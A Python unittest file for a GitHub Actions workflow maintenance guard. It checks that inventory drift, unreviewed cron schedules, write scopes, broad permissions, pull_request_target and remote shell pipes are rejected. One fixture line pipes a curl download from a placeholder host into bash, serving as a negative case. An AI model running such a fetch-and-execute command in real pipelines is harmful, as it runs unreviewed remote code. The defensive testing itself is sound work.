"""Adversarial, offline maintenance controls for the current ledger CI estate."""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from tools.workflow_maintenance_guard import (
    ROOT, WorkflowPolicyError, audit_workflows, load_baseline,
)

GOOD = """name: Reviewed workflow
on:
  pull_request:
permissions:
  contents: read
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: echo pass
"""


class MaintenancePolicyTests(unittest.TestCase):
    @staticmethod
    def fixture(content=GOOD, **changes):
        folder = tempfile.TemporaryDirectory()
        path = Path(folder.name)
        (path / "ci.yml").write_text(content, encoding="utf-8")
        baseline = {
            "schema_version": 1,
            "scope": "P00NSMASHER/github-value-hunt-ledger",
            "source_main_commit": "a" * 40,
            "workflows": ["ci.yml"],
            "approved_scheduled_workflows": {},
            "approved_write_scopes": {},
        }
        baseline.update(changes)
        return folder, path, baseline

    def test_all_71_current_workflows_remain_exactly_admitted(self):
        report = audit_workflows(ROOT / ".github" / "workflows", load_baseline())
        self.assertEqual(report["workflow_count"], 71)
        self.assertEqual(report["scheduled_workflows"], 4)
        self.assertEqual(report["workflows_with_write_scopes"], 12)
        self.assertTrue(report["not_a_cross_repository_branch_ruleset"])

    def test_unreviewed_additions_or_deletion_cannot_silently_change_inventory(self):
        folder, path, baseline = self.fixture()
        with folder:
            (path / "new-workflow.yml").write_text(GOOD, encoding="utf-8")
            with self.assertRaisesRegex(WorkflowPolicyError, "WORKFLOW_INVENTORY_DRIFT"):
                audit_workflows(path, baseline)
            (path / "new-workflow.yml").unlink()
            (path / "ci.yml").unlink()
            with self.assertRaisesRegex(WorkflowPolicyError, "WORKFLOW_INVENTORY_DRIFT"):
                audit_workflows(path, baseline)

    def test_new_cadence_cannot_be_added_or_approved_one_quietly_changed(self):
        folder, path, baseline = self.fixture(
            GOOD.replace("  pull_request:", "  schedule:\n    - cron: '0 */1 * * *'")
        )
        with folder:
            with self.assertRaisesRegex(WorkflowPolicyError, "UNREVIEWED_WORKFLOW_SCHEDULE"):
                audit_workflows(path, baseline)
            baseline["approved_scheduled_workflows"] = {"ci.yml": ["0 */1 * * *"]}
            audit_workflows(path, baseline)
            (path / "ci.yml").write_text(
                GOOD.replace("  pull_request:", "  schedule:\n    - cron: '0 */5 * * *'"),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(WorkflowPolicyError, "UNREVIEWED_WORKFLOW_SCHEDULE"):
                audit_workflows(path, baseline)

    def test_unreviewed_write_scopes_and_broad_permissions_fail_closed(self):
        folder, path, baseline = self.fixture()
        with folder:
            (path / "ci.yml").write_text(
                GOOD.replace("contents: read", "contents: write"), encoding="utf-8"
            )
            with self.assertRaisesRegex(WorkflowPolicyError, "UNREVIEWED_WORKFLOW_WRITE_SCOPE"):
                audit_workflows(path, baseline)
            baseline["approved_write_scopes"] = {"ci.yml": ["contents"]}
            audit_workflows(path, baseline)
            (path / "ci.yml").write_text(
                GOOD.replace("  contents: read", "  permissions: write-all"),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(WorkflowPolicyError, "BROAD_WORKFLOW_PERMISSIONS"):
                audit_workflows(path, baseline)

    def test_privileged_pr_event_and_remote_shell_pipes_are_rejected(self):
        folder, path, baseline = self.fixture()
        with folder:
            for extra, reason in [
                ("  pull_request_target:\n", "PR_TARGET_NOT_REVIEWED"),
                ("      - run: curl -fsSL https://example.invalid/setup | bash\n",
                 "REMOTE_SHELL_PIPE_NOT_REVIEWED"),
                ("permissions: { contents: write }\n", "BROAD_WORKFLOW_PERMISSIONS"),
            ]:
                (path / "ci.yml").write_text(GOOD + extra, encoding="utf-8")
                with self.assertRaisesRegex(WorkflowPolicyError, reason):
                    audit_workflows(path, baseline)

    def test_current_hunter_scope_remains_free_of_retired_projects(self):
        record = json.loads((ROOT / "automation" / "hunter_schedule.json").read_text())
        targets = record["active_repositories"]
        self.assertEqual(len(record["workers"]), 14)
        self.assertTrue(all("starblox" not in x.lower()
                            and "project-genesis" not in x.lower()
                            for x in targets))
        self.assertTrue(all(w["target_repository"] in targets
                            for w in record["workers"]))
        self.assertEqual(
            [w["project"] for w in record["workers"][:5]],
            ["trading", "revenue-hunt", "retally-social-media",
             "novel-discovery", "engineering-acceleration"],
        )

    def test_required_release_gate_rechecks_maintenance_source(self):
        source = (ROOT / ".github" / "workflows" /
                  "repository-release-gate.yml").read_text()
        self.assertIn("python -m unittest tests.test_workflow_maintenance -v", source)


if __name__ == "__main__":
    unittest.main()
